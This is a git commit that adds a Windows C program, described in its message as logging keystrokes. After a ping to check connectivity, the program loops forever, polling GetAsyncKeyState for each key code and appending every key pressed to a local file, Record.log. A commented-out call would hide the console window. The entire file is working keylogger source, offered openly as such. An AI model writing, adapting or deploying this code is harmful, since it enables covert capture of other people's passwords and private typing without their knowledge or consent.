0bcf88f444ad2d11debbcf92fb9c8d7eea62ed44
ayiz09 <arepp09@gmail.com>
2021-05-25 10:05:11 +0800

    Add files via upload
    Log keystroke

---
+++ main.c
@@ -0,0 +1,55 @@
+#include <windows.h>
+#include <stdio.h>    
+#include <process.h>
+
+#define FILE_NAME "Record.log"
+#define LIFE_TIME 5
+
+void logKey();
+
+int age = 0;
+
+int main() {
+
+	//FreeConsole();
+	//int number;
+	if (!system("ping www.google.com -n 1")) {
+		printf("Has Connection");
+		//scanf_s("%d", &number);
+		int age = 1;
+		while (1) {
+			////////////****LOG KEY****////////////
+			if (age <= LIFE_TIME) {
+				logKey();
+			}
+			else {
+				Sleep(5000);
+			}
+		}
+
+	}
+	printf("No connection");
+	//scanf_s("%d", &number);
+		
+}
+
+void logKey() {
+	FILE *file;
+	unsigned short ch = 0, i = 0, j = 1; // :)
+
+	while (j < 500) { ///loop runs for approx. 25 seconds
+		ch = 1;
+		while (ch < 250) {
+			for (i = 0; i < 50; i++, ch++) {
+				if (GetAsyncKeyState(ch) == -32767) { ///key is stroke
+					file = fopen(FILE_NAME, "a");
+					fprintf(file, "%d ", ch);
+					fclose(file);
+				}
+			}
+			Sleep(1); ///take rest
+		}
+		j++;
+	}
+}
+
